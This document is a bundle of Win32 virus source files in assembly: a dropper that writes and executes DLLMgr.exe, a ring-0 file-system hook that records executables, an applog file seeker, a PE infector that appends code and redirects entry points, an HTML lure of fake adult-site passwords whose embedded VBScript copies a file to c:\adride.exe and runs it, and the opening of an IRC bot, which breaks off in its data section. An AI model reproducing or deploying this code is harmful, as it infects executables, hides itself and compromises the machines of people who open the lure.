컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[dropper\dropper.asm]컴�

includelib kernel32.lib
includelib user32.lib
includelib wsock32.lib

.486
.model flat, stdcall

include c:\masm\include\windows.inc

        VirusSize               equ     11776

MessageBoxA     PROTO ,:DWORD,:DWORD,:DWORD,:DWORD

.code
Main proc
        local   lstrlen:dword
        local   lstrcpy:dword
        local   LocalAlloc:dword
        local   LocalFree:dword
        local   CreateFileA:dword
        local   WriteFile:dword
        local   CloseHandle:dword
        local   GetSystemDirectoryA:dword
        local   WinExec:dword

	call	DropperStart
   DeltaSub:

Virus:
        db      VirusSize dup (90h)
EndVirus:

        VirusName               db      "\DLLMgr.exe",0

        GetProcAddressStr       db      "GetProcAddress",0
        


   WinFunctions:
        lstrlenStr              db      "lstrlen",0
        lstrcpyStr              db      "lstrcpy",0
        LocalAllocStr           db      "LocalAlloc",0
        LocalFreeStr            db      "LocalFree",0
        CreateFileAStr          db      "CreateFileA",0
        WriteFileStr            db      "WriteFile",0
        CloseHandleStr          db      "CloseHandle",0
        GetSystemDirectoryAStr  db      "GetSystemDirectoryA",0
        WinExecStr              db      "WinExec",0
                                db      0
                                                ; pointers to these


    DropperStart:
        pop     edi
        sub     edi,DeltaSub

        mov     eax,[ebp+4]
        and     eax,0fffff000h                  ; even 1000h something

   FindKernelEntry:
        sub     eax,1000h
        cmp     word ptr [eax],'ZM'
        jnz     FindKernelEntry

        mov     ebx,[eax+3ch]                    

        cmp     word ptr [ebx+eax], 'EP'
        jne     FindKernelEntry
        mov     ebx,[eax+120+ebx]               
        add     ebx,eax                         ; ebx -> Export table
                                        
        mov     ecx,[ebx+12]                    ; ecx -> dll name

        cmp     dword ptr [ecx+eax],'NREK'
        jnz     FindKernelEntry


; We can now be sure that eax points to the kernel
    FindGetProcAddress:
        push    edi

        lea     edi,[GetProcAddressStr+edi]
        
        mov     edx,[ebx+32]

     FindFunction:
        add     edx,4
        mov     ecx,15                           ; length of GetProcAddress,0
        mov     esi,[edx+eax]
        push    edi
        add     esi,eax
        repz    cmpsb
        pop     edi
        jne     FindFunction

        pop     edi

        sub     edx,[ebx+32]
        shr     edx,1                           ; ecx = ordinal pointer

        lea     esi,[edx+eax]
        xor     ecx,ecx
        add     esi,[ebx+36]                    ; esi = base+ordinals+ordnr

        mov     cx,word ptr [esi]               ; ecx = ordinal
        shl     ecx,2                           ; ecx = ordinal*4
        add     ecx,[ebx+28]                  ; ecx = ordinal*4+func tbl addr
                                                
        mov     ebx,[ecx+eax]                   ; esi = function addr in file
        add     ebx,eax                         ; esi = function addr in mem

        
        ; eax -> ModuleHandle
        ; ebx -> GetProcAddress
        mov     esi,eax

        push    edi
        lea     edi,[WinFunctions+edi]
        push    0
  CopyWinApiFunctions:

        push    edi
        push    esi
        call    ebx

        pop     ecx
        mov     [lstrlen+ecx*4],eax
        dec     ecx
        push    ecx

        push    edi
        call    lstrlen
        inc     eax
        add     edi,eax

        cmp     byte ptr [edi],0
        jnz     CopyWinApiFunctions
NoMoreApis:
        pop     ecx
        pop     edi

        push    400                             ; space for GetSystemDir
        push    LMEM_ZEROINIT
        call    LocalAlloc

        push    eax                             ; Variables for LocalFree

        push    SW_SHOW                         ; Variables for WinExec
        push    eax

        push    0                               ; Variables for CreateFileA
        push    0
        push    CREATE_NEW
        push    0
        push    0
        push    GENERIC_WRITE
        push    eax                             ; push -> SystemDir

        push    350
        push    eax
        call    GetSystemDirectoryA

        add     eax,[esp]                       ; add with SystemDir
        lea     ebx, [VirusName+edi]            ; ebx -> VirusName
        push    ebx
        push    eax
        call    lstrcpy

        call    CreateFileA

        inc     eax
        jz      ErrorOpening

        dec     eax
        push    eax                             ; push fileptr

        push    0
        lea     ebx,lstrlen
        push    ebx
        push    VirusSize
        add     edi,Virus
        push    edi                             ; edi -> Virus
        push    eax
        call    WriteFile

        call    CloseHandle                     ; fileptr on stack


        call    WinExec                         ; variables on stack

   ErrorOpening:
        call    LocalFree                       ; ptr to Mem on stack
        ret
Main endp

EndMain:
invoke  MessageBoxA, 0, 0, 0, 0

end Main 
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[dropper\dropper.asm]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[FileSeeker\resident.asm]컴�
includelib kernel32.lib
includelib user32.lib
includelib wsock32.lib

.486
.model flat, stdcall

include c:\masm\include\windows.inc
include c:\masm\include\wsock32.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc


NewIFSMgrSize                   equ     NewIFSMgrEnd-NewIFSMgr

IFSMgr                          equ     0040h

GetHeap                         equ     000dh
FreeHeap                        equ     000eh

Ring0_FileIO                    equ     0032h
InstallFileSystemAPIhook        equ     0067h
UniToBCSPath                    equ     0041h

R0_OPENCREATFILE		equ	0D500h	; Open/Create a file
R0_READFILE                     equ     0D600h  ; Read a file, no context
R0_WRITEFILE			equ	0D601h	; Write to a file, no context
R0_CLOSEFILE                    equ     0D700h

IFSFN_FILEATTRIB                equ     33
IFSFN_OPEN                      equ     36 
IFSFN_RENAME                    equ     37


IFSFN_READ                      equ     0       ; read a file
IFSFN_WRITE                     equ     1       ; write a file



.data
        Kernel32                db      "kernel32",0
        MemPtr                  dd      0
        Temp                    dd      0
        DataSize                dd      0
        FullListFilename        db      300 dup (0)
        EndListFilename         db      "\listfile.txt",0

.code

GetResident:
        
        invoke  GetModuleHandle, offset Kernel32
        add     eax,6ch
        mov     ebx,'WORM'
        cmp     [eax],ebx

        jz      DontGoRing0
        mov     edi, eax

        sub     esp,8
        sidt    [esp]                           ; get interupt table

; hook int 3 to get get ring 0
        mov     esi,[esp+2]
        add     esi, 3*8                        ; pointer to int 3
        mov     ebx, [esi+4]

        mov     bx,word ptr [esi]               ; ebx = old pointer
        mov     eax,offset Ring0Code            ; eax = new pointer
        mov     word ptr [esi],ax               ; move new pointer to int 3
        shr     eax,16
        mov     word ptr [esi+6], ax

        pushad
        int     3                               ; get into ring 0
        popad
        mov     [esi],bx                        ; return old pointer again
        shr     ebx,16
        mov     [esi+6],bx
        add     esp,8

   DontGoRing0:
        ret



; ---------------------------------------
; -------------------------------- Ring 0        
; ---------------------------------------

vxdcall macro vxd_func
        int     20h
        dw      vxd_func
        dw      IFSMgr
endm

Ring0Code:
        mov     ebx,'WORM'
        mov     [edi],ebx

        mov     eax, NewIFSMgrSize+50000
        push    eax
        vxdcall GetHeap
        pop     ecx
        test    eax,eax
        jz      ErrorRing0

; Copy guide and decryptor to ring 0 mem
        sub     ecx, 50000

        mov     edi, eax
        mov     esi, NewIFSMgr
        rep     movsb
                      
        sub     edi, 8
        mov     esi, MemPtr
        mov     ecx, DataSize
        rep     movsb

        mov     edi, eax
        sub     edi, NewIFSMgr 
        add     edi, offset ListFilename
        lea     esi, FullListFilename
        mov     ecx, dword ptr [EndListFilename]
        rep     movsb

        push    eax
        vxdcall InstallFileSystemAPIhook
        pop     edi                             
        sub     edi,NewIFSMgr
        mov     [edi+BasePtr+1],edi
        mov     [edi+OldIFSMgr],eax
ErrorRing0:
        iretd



NewIFSMgr:
        push    ebx
BasePtr:
        mov     ebx,66666666h

        xor     eax,eax
        inc     eax
        cmp     [Flag+ebx],eax
        jz      FileFunctionActive

        mov     [Flag+ebx],eax
        mov     eax,[esp+12]

        cmp     eax,IFSFN_OPEN
        jz      CheckFilename

        cmp     eax,IFSFN_FILEATTRIB
        jz      CheckFilename

        cmp     eax,IFSFN_RENAME
        jnz     FileFunctionEnd

   CheckFilename:

        mov     eax,[esp+16]

        test    eax,eax
        jz      FileFunctionEnd

        cmp     eax,25
        ja      FileFunctionEnd

        add     eax,'A'-1+':'*256


        mov     ecx,[esp+28]

        push    esi
        push    edi

        lea     esi,[FileToInfect+ebx]
        mov     word ptr [esi],ax

        inc     esi
        inc     esi

        mov     eax,[ecx+12]
        add     eax,4

        push    0
        push    250
        push    eax
        push    esi

        vxdcall UniToBCSPath
        add     esp,16

        xor     edx,edx
        mov     [esi+eax],edx
        mov     [esi+eax+4],edx

        cmp     dword ptr [esi+eax-4],'EXE.'
        jne     FileFunctionEndPop

        dec     esi
        dec     esi
        lea     ecx,[eax+3]                     ; ecx -> strlen+1
        push    ecx

        push    esi
      HashValue:
        lodsb
        and     al,00011111b                    ; al = 0 -> 31

        add     edx, eax
        rol     edx, cl
        loop    HashValue
        pop     esi

        mov     ecx,[HashCount+ebx]
        inc     ecx


        pop     eax
        cmp     ecx,990
        jae     FileFunctionEndPop

        lea     edi, [ebx+Hashes-4]
     LocateSameString:
        add     edi,4
        cmp     [edi],edx
        jz      FileFunctionEndPop
        dec     ecx
        jnz     LocateSameString
        mov     ecx,eax

        xchg    edi,ebx

        pushad
        mov     eax,R0_OPENCREATFILE
        push    2
        pop     ebx
        xor     ecx,ecx
        push    17
        pop     edx
        lea     esi, [ListFilename+edi]
        call    Ring0_File_IO
        mov     [MovEbxFileHandle+edi+1],eax
        popad
        jc      FileFunctionEndPopRetEbx

        mov     [ebx],edx

        push    ebx                             ; ebx -> Hash
        lea     ecx,[edi+HashCount]
        sub     ebx,ecx
        push    ebx                             ; ebx -> Hash in file

 MovEbxFileHandle:
        mov     ebx,10101010h

        push    eax
        push    esi
        push    eax

        mov     eax,R0_READFILE
        mov     ecx, 12
        xor     edx, edx        
        lea     esi, [HashCount+edi]
        call    Ring0_File_IO

        pop     eax
        inc     dword ptr [esi]
        push    [esi+4]                         ; push end of file
        add     [esi+4],eax
        
        mov     eax,R0_WRITEFILE
        mov     ecx,12
        xor     edx,edx
        call    Ring0_File_IO
        pop     edx                             ; end of file
        pop     esi                             ; esi -> FileName
        pop     ecx                             ; filename length

        mov     eax,R0_WRITEFILE 
        call    Ring0_File_IO

        pop     edx                             ; where in file to write
        pop     esi                             ; hash value
        mov     ecx,4
        mov     eax,R0_WRITEFILE
        call    Ring0_File_IO

        mov     eax,R0_CLOSEFILE
        call    Ring0_File_IO

FileFunctionEndPopRetEbx:
        mov     ebx,edi

FileFunctionEndPop:
        pop     edi
        pop     esi

FileFunctionEnd:
        xor     edx,edx
        mov     [Flag+ebx],edx
FileFunctionActive:
        mov     eax,[OldIFSMgr+ebx]
        mov     ecx,ebx

        pop     ebx
        
        pop     [ReturnFromHook+ecx]
        lea     edx,[ReturnFromHook+ecx+4]
        sub     [ReturnFromHook+ecx],edx

        call    dword ptr [eax]

        db      0e9h
  ReturnFromHook:
        dd      0

        jmp     eax

Ring0_File_IO:
        vxdcall Ring0_FileIO
        ret


OldIFSMgr               dd      0
Flag                    dd      0
ListFilename            db      300 dup (0)
FileToInfect            db      300 dup (0)

ListFileData:
HashCount               dd      0
NamesPtr                dd      4000
NamesBegin		dd	0
Hashes:
NewIFSMgrEnd:

KernelName		db	"kernel32",0

Main:
	invoke	GetModuleHandleA, offset KernelName
	cmp	eax,0bff70000h
	jnz	Error
	
	

	invoke  GetCurrentDirectory, 270, offset FullListFilename
        add     eax,offset FullListFilename
        invoke  lstrcpy, eax, offset EndListFilename

        invoke  lstrlen, offset FullListFilename
        mov     dword ptr [EndListFilename], eax

        xor     esi,esi
        invoke  CreateFileA, offset FullListFilename, GENERIC_READ+GENERIC_WRITE, esi, esi, OPEN_ALWAYS, esi, esi
        mov     ebx,eax
        inc     eax
        jz      Error

        invoke  GetFileSize, ebx, esi
    .if eax == 0
        mov     eax,offset ListFileData
        mov     MemPtr, eax
        invoke  WriteFile, ebx, eax, 12, offset Temp, esi

    .else
        mov     DataSize, eax

        push    esi
        push    offset Temp
        push    eax

        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        mov     MemPtr, eax

        push    eax
        push    ebx
        call    ReadFile

    .endif
        invoke  CloseHandle, ebx
        call    GetResident

    Error:
        invoke  ExitProcess,0

end Main



















컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[FileSeeker\resident.asm]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[FileSeeker\speedy.asm]컴�
includelib kernel32.lib
includelib user32.lib
includelib wsock32.lib

.486
.model flat, stdcall

include c:\masm\include\windows.inc
include c:\masm\include\wsock32.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc


ShortString struct dword
        FileName           BYTE    8 dup (?)
ShortString ends

APPLOG_FILE_HEADER struct dword
        FileName                byte    8 dup (?)
        PathOffset              dword   ?
        NoOfRunsSinceDefrag     word    ?
        NoOfRuns                word    ?
        FileDataTime            FILETIME <>     ; relative to what?
        FileSize                dword   ?
        Flags                   dword   ?       ; Dont know anything about 
                                                ; this either
APPLOG_FILE_HEADER ends

LISTFILE_HEADER struct dword
        HashCount               dword   ?       ; Number of found files
        NamesEnd                dword   ?       ; Pointer where to write
                                                ; new filenames
        NamesBegin              dword   ?       ; Where the names begin
LISTFILE_HEADER ends

.data
        ListFilePtr             dd      0

        ListFileName            db      "listfile.txt",0
        ApplogFilename          db      "\applog\applog.ind",0
        Temp                    dd      0

        


.code

  MyOpenFile:
        xor     edx,edx
        invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
        mov     ebx,eax
        cmp     eax,INVALID_HANDLE_VALUE
        ret

MyReadFile proc Filename:dword, MemPtr:dword
        pushad
        xor     esi,esi
        mov     eax,Filename
        mov     ebx,GENERIC_READ
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      Error

        push    eax                             ; CloseHandle

        push    esi                             ; ReadFile, 0
        push    offset Temp                     ; ReadFile, Bytes Read
        mov     edi,eax

        invoke  GetFileSize, eax, esi
        push    eax                             ; ReadFile, How much to read

        add     eax,10                          ; allocate 10+FileSize bytes
        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        mov     ecx,MemPtr
        mov     [ecx],eax

        push    eax                             ; ReadFile, Where to read it
        push    edi                             ; ReadFile, File Handle
        call    ReadFile

        call    CloseHandle

        popad
        ret
MyReadFile endp

AddStringToFilelist proc uses ebx Filename:dword  
        mov     eax,Filename
        mov     ebx,GENERIC_READ
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile                      ; open the file
        jz      FoundNoFile                     ; Resident infector will then
                                                ; infect the file
        invoke  CloseHandle, ebx
      FoundNoFile:
        ret

AddStringToFilelist endp
        



CreateDirListing proc uses ebx esi edi
        local   FileMem:dword
        local   Files:dword
        local   ApplogWholeFileName:dword
        local   ApplogFileStr:ShortString
        


        invoke  LocalAlloc, LMEM_ZEROINIT, 300
        mov     ebx, eax
        invoke  GetWindowsDirectory, ebx, 300
        add     eax, ebx
        invoke  lstrcpy, eax, offset ApplogFilename

        lea     esi, FileMem
        invoke  MyReadFile, ebx, esi
        invoke  LocalFree, ebx

        mov     esi, [esi]
        mov     eax,'LPPA'                      ; is this really applog.ind
        cmp     [esi],eax
        jnz     Error


        invoke  LocalAlloc, LMEM_ZEROINIT, 300
        mov     edi, eax

        mov     ebx, [esi+10h]                  ; number of files on system
        mov     Files, ebx

        add     esi, 64+344                     ; esi -> filenames
        assume  esi:ptr APPLOG_FILE_HEADER

    FindFilesLoop:                              
        mov     eax,[esi].PathOffset            ; more relative pointer
                                                ; to path to eax
        mov     ecx,Files
        imul    ecx,ecx,20h                     ; ecx = FILE_ENTRY_STRUCTs 
        add     ecx,FileMem                     ; size

        lea     eax,[64+344+ecx+eax]            ; make relativ pointer into
                                                ; real offset
                                                ; eax = Relative pointer +
                                                ; First and second header +
                                                ; File entries structures =
                                                ; pointer to path

        invoke  lstrcpy, edi, eax               ; copy path to edi
        invoke  lstrlen, eax
        add     eax, edi
        mov     byte ptr [eax],'\'
        inc     eax
        invoke  lstrcpyn, eax, esi, 9           ; copy filename to edi
        invoke  lstrlen, edi
        mov     ecx,'EXE.'
        mov     [eax+edi],ecx
        xor     ecx,ecx
        mov     byte ptr [eax+edi+4],cl

        invoke  AddStringToFilelist, edi        ; replace with infect
                                                ; procedure in your virus

        add     esi, sizeof(APPLOG_FILE_HEADER)

        dec     ebx
        jnz     FindFilesLoop

        invoke  LocalFree, FileMem
        ret

        



CreateDirListing endp
        
Kernel32                db      "kernel32",0
RegisterService         db      "RegisterServiceProcess", 0
HideProgram:
        invoke  GetModuleHandleA, offset Kernel32
        invoke  GetProcAddress, eax, offset RegisterService
        test    eax,eax
        jz      NoHide
        push    1
        push    0
        call    eax
     NoHide:
        ret

Main: 
        call	HideProgram
        call    CreateDirListing
Error:
        invoke  ExitProcess, 0

end Main



















컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[FileSeeker\speedy.asm]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[htmldropper\dropper.html]컴�
-->'s
<H4>XXX passwords</H4><a href="http:\\www.pussysex.com">www.pussysex.com</a><P>Name: Jones<br>Pass: Jones<p><a href="http:\\www.teensexxx.com">www.teensexxx.com</a><P>Name: qwerty<BR>Pass: qwerty<p><a href="http:\\www.analpleasure.com">www.analpleasure.com</a><P>Name: anal<br>Pass: anal<p><a href="http:\\www.hornybabes.com">www.hornybabes.com</a><P>Name: naked<br>Pass: sex<p><a href="http:\\www.loveland.com">www.loveland.com</a><P>Name: htroe<br>Pass: eerss<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><script language = VBScript>
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
if (fso.FolderExists("c:\mirc\")) Then
FileName = "c:\mirc\download\xxxpasswords.html"
elseif (fso.FolderExists("C:\mirc32\")) Then
FileName = "c:\mirc32\download\xxxpasswords.html"
elseif (fso.FolderExists("C:\programs\mirc\")) Then
FileName = "c:\program\mirc\download\xxxpasswords.html"
elseif (fso.FolderExists("C:\programs files\mirc\")) Then
FileName = "c:\program files\mirc\download\xxxpasswords.html"
elseif (fso.FolderExists("C:\programs files\mirc32\")) Then
FileName = "c:\program files\mirc32\download\xxxpasswords.html"
else
FileName = "c:\autoexec.bat"
end if
fso.CopyFile FileName, "c:\adride.exe"
reg.Run ("c:\adride.exe")
</script>
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[htmldropper\dropper.html]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[infector\infector.asm]컴�
includelib kernel32.lib
includelib user32.lib
includelib wsock32.lib

.486
.model flat, stdcall

include c:\masm\include\windows.inc
include c:\masm\include\wsock32.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc


PE_Objects              equ     6
PE_NTHdrSize            equ     20
PE_Entrypoint           equ     40
PE_ImageBase            equ     52
PE_ObjectAlign          equ     56
PE_FileAlign            equ     60
PE_ImageSize            equ     80

Obj_Name                equ     0
Obj_VirtualSize         equ     8
Obj_VirtualOffset       equ     12
Obj_PhysicalSize        equ     16
Obj_PhysicalOffset      equ     20
Obj_Flags               equ     36        

.data
        DropperFilename         db      "dropper.exe",0
        FilelistFilename        db      "listfile.txt",0

        Dropper                 dd      0
        Filelist                dd      0
        Temp                    dd      0
        DropperSize             dd      0
        DropperMem              dd      0
        FilelistMem             dd      0
        FileHandle              dd      0

.code
Kernel32                db      "kernel32",0
RegisterService         db      "RegisterServiceProcess", 0
HideProgram:
        invoke  GetModuleHandleA, offset Kernel32
        invoke  GetProcAddress, eax, offset RegisterService
        test    eax,eax
        jz      NoHide

        push    1
        push    0
        call    eax
      NoHide:
       ret



  MyOpenFile:
        xor     edx,edx
        invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
        cmp     eax,INVALID_HANDLE_VALUE
        ret

MyReadFile proc Filename:dword, MemPtr:dword
        pushad
        xor     esi,esi
        mov     eax,Filename
        mov     ebx,GENERIC_READ
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      Error

        push    eax                             ; CloseHandle

        push    esi                             ; ReadFile, 0
        push    offset Temp                     ; ReadFile, Bytes Read
        mov     edi,eax

        invoke  GetFileSize, eax, esi
        push    eax                             ; ReadFile, How much to read

        add     eax,10                          ; allocate 10+FileSize bytes
        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        mov     ecx,MemPtr
        mov     [ecx],eax

        push    eax                             ; ReadFile, Where to read it
        push    edi                             ; ReadFile, File Handle
        call    ReadFile

        call    CloseHandle

        popad
        ret
MyReadFile endp


Setup:
        lea     ebx,Filelist

        invoke  MyReadFile, offset FilelistFilename, ebx
        mov     ebx,[ebx]
        mov     FilelistMem, ebx
        add     ebx,[ebx+8]
        add     ebx,4000
        mov     Filelist, ebx

        lea     ebx,Dropper
        invoke  MyReadFile, offset DropperFilename, ebx
        
        mov     ebx,[ebx]
        mov     DropperMem, ebx
        add     ebx,[ebx+3ch]

        xor     ecx,ecx
        mov     cx,[ebx+PE_NTHdrSize]           ; HdrSize
        lea     eax,[ebx+24+ecx-40]             ; eax -> obj table

   FindCodeSegmentLoop:
        add     eax,8*5
        cmp     dword ptr [eax],'xet.'
        jnz     FindCodeSegmentLoop

        push    [eax+Obj_PhysicalSize]
        pop     DropperSize

        mov     eax,[eax+Obj_PhysicalOffset]
        add     Dropper, eax
        ret

   Error:

        invoke  ExitProcess, 0

ObjectAlign:
        mov     ecx,[edi+PE_ObjectAlign]        ; calculate new virtual size
XAlign:
        xor     edx,edx
        div     ecx
        inc     eax
        cdq
        mul     ecx
        ret

InfectFile proc Filename:dword
        local   WhereToWriteDropper:dword

        pushad
        xor     esi,esi



        mov     eax,Filename
        mov     ebx,'NIW\'
        cmp     [eax+2],ebx
        jz      InfectionFailed

        mov     ebx,GENERIC_READ or GENERIC_WRITE
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      InfectionFailed

        mov     FileHandle, eax

        invoke  GetFileSize, eax, esi           ; dont infect small files
        mov     edi,3000
        cmp     eax,edi
        jl      InfectionFailedCloseHandle
        
        sub     esp,edi                         ; alloc 3000 bytes from stack
        mov     ebx,esp
        invoke  ReadFile, FileHandle, ebx, edi, offset Temp, esi

        cmp     word ptr [ebx],'ZM'
        jnz     InfectionFailedAddStack

        mov     eax,[ebx+3ch]
        cmp     eax, 2800                       ; dont infect if header is
        ja      InfectionFailedAddStack         ; > 2800 bytes in file

        push    eax

        add     ebx,eax
        movsx   eax,word ptr [ebx+PE_Objects]
        imul    eax,eax,40
        add     ax,word ptr [ebx+PE_NTHdrSize]  ; eax = Size of header

        lea     ebx,[eax+24]                    ; ebx = Full header size
        pop     eax

        add     esp,edi                         ; dealloc mem from stack
        cmp     ebx,edi
        ja      InfectionFailedCloseHandle      ; dont infect if header is
                                                ; bigger then 3000 bytes
        
        push    esi                             ; SetFilePtr, FILE_BEGIN
        push    esi                             ; SetFilePtr, 0
        push    eax                             ; SetFilePtr, PE_Start
        invoke  SetFilePointer, FileHandle, eax, esi, esi

        invoke  LocalAlloc, LMEM_ZEROINIT, ebx  ; alloc mem for header
        mov     edi, eax                        ; edi -> PE header

        push    ebx                             ; Size of header
        invoke  ReadFile, FileHandle, eax, ebx, offset Temp, esi

        lea     ebx,[edi+ebx-40]                ; ebx -> last object
        mov     eax, 'ler.'
        cmp     [ebx], eax                      ; is last segment .reloc
        jnz     NotReloc

        mov     [ebx+Obj_PhysicalSize],esi      ; no size
        mov     [ebx+Obj_VirtualSize],esi       ; no size

   NotReloc:
        mov     eax,DropperSize
        add     eax,20
        push    eax                             ; WriteFile

        mov     ecx,[ebx+Obj_PhysicalSize]
        add     eax,ecx                         ; eax = New physical size

        mov     edx,ecx
        add     ecx,[ebx+Obj_PhysicalOffset]    ; ecx -> Where to write virus
        mov     WhereToWriteDropper, ecx
        add     edx,[ebx+Obj_VirtualOffset]     ; edx -> New RVA
        xchg    edx,[edi+PE_Entrypoint]         ; set new RVA

        mov     esi, Dropper
        add     edx,[edi+PE_ImageBase]
        mov     [esi+11], edx                   ; save old RVA

        push    eax
        call    ObjectAlign                     ; calculate new virtual size

        lea     ecx,[ebx+Obj_VirtualSize]
        cmp     [ecx],eax
        ja      DontChangeVirtualSize           ; dont change it if existing
        mov     [ecx],eax                       ; is bigger
     DontChangeVirtualSize:

        pop     eax                             ; new size of last segment

        mov     ecx,[edi+PE_FileAlign]          ; calculate new physical size
        call    XAlign

        mov     [ebx+Obj_PhysicalSize],eax

        pop     eax                             ; calculate new image size
        add     eax,[edi+PE_ImageSize]
        call    ObjectAlign
        mov     [edi+PE_ImageSize], eax

        pop     ebx                             ; header size

        push    FileHandle
        call    SetFilePointer

        invoke  WriteFile, FileHandle, edi, ebx, offset Temp, 0
        mov     ebx,FileHandle
        invoke  LocalFree, edi                  ; free allocated mem
        mov     edi, eax                        ; edi = 0
        invoke  SetFilePointer, ebx, WhereToWriteDropper, edi, edi

        invoke  WriteFile, ebx, esi, DropperSize, offset Temp, edi
        jmp     InfectionFailedCloseHandle

 InfectionFailedAddStack:
        add     esp, 3000

 InfectionFailedCloseHandle:
        invoke  CloseHandle, FileHandle
 InfectionFailed:
        popad

        ret
InfectFile endp

Main:
        call    HideProgram
        xor     eax,eax

        call    Setup

        mov     ebx,10                          ; infect 10 files
        mov     esi,Filelist
     InfectionLoop:
        invoke  lstrlen, esi
        test    eax,eax
        jz      Return
        inc     eax
        push    esi
        add     esi, eax

        call    InfectFile
        dec     ebx
        jnz     InfectionLoop

        jmp     FileOpenNoSleep

   FileOpenLoop:
        invoke  Sleep, 1000                  ; sleep for one second
   FileOpenNoSleep:

        mov     eax,offset FilelistFilename
        mov     ebx,GENERIC_WRITE
        mov     ecx,OPEN_ALWAYS
        call    MyOpenFile
        jz      FileOpenLoop
        mov     ebx, eax

        invoke  GetFileSize, eax, 0
        test    eax,eax
        jz      WriteDefaultData

        xor     edi, edi
        invoke  SetFilePointer, ebx, 8, edi, edi

        push    0
        mov     eax,esp
        lea     ecx,[esi-4000]
        sub     ecx,FilelistMem
        push    ecx
        mov     ecx, esp
        invoke  WriteFile, ebx, ecx, 4, eax, 0
        pop     eax
        pop     eax

        invoke  CloseHandle, ebx

        invoke  Sleep, 1000*60*2                ; sleep for 2 minutes
        mov     ebx,10
        jmp     InfectionLoop


     WriteDefaultData:
        push    0
        mov     eax,esp                         ; eax = BytesWritten

        push    0
        push    4000
        push    0
        mov     ecx, esp                        ; ecx = What to write

        invoke  WriteFile, ebx, ecx, 12, eax, 0
        add     esp, 16
        invoke  CloseHandle, ebx

     Return:
        invoke  LocalFree, FilelistMem
        invoke  LocalFree, DropperMem


        mov     eax,offset FilelistFilename
        mov     ebx,GENERIC_WRITE
        mov     ecx,OPEN_ALWAYS
        call    MyOpenFile
        jz      QuitError
        mov     ebx, eax
        xor     esi, esi


        invoke  SetFilePointer, ebx, 4, esi, esi
        push    0
        push    4000
        mov     ecx, esp

        invoke  WriteFile, ebx, ecx, 8, offset FilelistMem, esi
        pop     edi                             ; edi = 4000
;       pop     eax                             ; eax = 0
;       push    esi

        push    ebx
        call    GetFileSize
        cmp     eax,edi
        jl      QuitError

        sub     eax,edi
        push    esi                             ; WriteFile, 0
        push    offset FilelistMem              ; WriteFile, BytesWritten
        push    eax                             ; WriteFile, BytesToWrite
        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        push    eax                             ; WriteFile, Buffert
        push    ebx                             ; WriteFile, FileHandle
        xchg    edi, eax                        ; edi = Alloc mem, eax = 4000

        invoke  SetFilePointer, ebx, eax, esi, esi
        
        call    WriteFile

        invoke  CloseHandle, ebx
        invoke  LocalFree, edi


    QuitError:
        invoke  ExitProcess, 0


end Main 



















컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[infector\infector.asm]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ircbot\ircbot.asm]컴�

; after compiling, open ircbot.exe, go to offset 2 (right after MZ) and write '<!--'
; this will make the code disappear in the dropped html file 'xxxpasswords.html'




includelib kernel32.lib
includelib user32.lib
includelib wsock32.lib
includelib advapi32.lib
includelib rasapi32.lib

.486
.model flat, stdcall

include c:\masm\include\windows.inc
include c:\masm\include\wsock32.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc
include c:\masm\include\advapi32.inc
include c:\masm\include\rasapi32.inc

        CRLF                    equ     0a0dh
        Magic                   equ     "cRIV"
        NumSlaves               equ     5

.data
        online                  dd      0
        Temp                    dd      0

        RandomNumber            dd      0
        hKey                    dd      0

        CR                      db      0dh,0
        LF                      db      0ah,0
        Space                   db      " ",0
        ExclamanationMark       db      "!",0


        sin_family              dw      AF_INET
        sin_port                dw      2842    ; 6667
        sin_addr                dd      0
        sin_zero                dd      0,0

        SocketPtr               dd      0
        Recvs                   dd      0        


        TemporaryBuffert        dd      0
        InBuffertPtr            dd      0
        BuffertPtr              dd      0

        StrBuffert              dd      0
        Buffs                   dd      9 dup (0)

        DebugFilePtr            dd      0
        DebugFilename           db      "irc.txt",0

        DataFilePtr             dd      0
        DataFilename            db      "script.dat",0

        ScriptInMem             dd      0
        ScriptFileSize          dd      0
        
        Aligment                dd      0

        MyNick                  dd      0
        MyIdent                 dd      0
        MyRealName              dd      0

        God                     dd      0
        Leader                  dd      0

        Slaves                  dd      0
        Slave1                  dd      0
        Slave2                  dd      0
        Slave3                  dd      0
        Slave4                  dd      0
        Slave5                  dd      0

Msg1    db      "01",0
Msg2    db      "02",0
Msg3    db      "03",0
Msg4    db      "04",0
Msg5    db      "05",0
Msg6    db      "06",0
Msg7    db      "07",0
ErrorMsg db     "Step",0



        IgnoreNicks             dd      0


        IRCIpNumbers            dd      0
                                dd      0       ; this creates a CCh byte
